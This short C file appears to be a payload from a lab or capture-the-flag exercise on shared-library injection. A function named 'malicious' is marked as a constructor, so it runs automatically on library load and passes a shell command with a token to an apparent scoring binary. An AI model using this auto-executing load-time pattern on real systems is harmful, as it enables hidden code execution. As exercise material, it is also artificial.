#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 9bcd61c5-df16-47ae-9755-ceb35028f767");
}
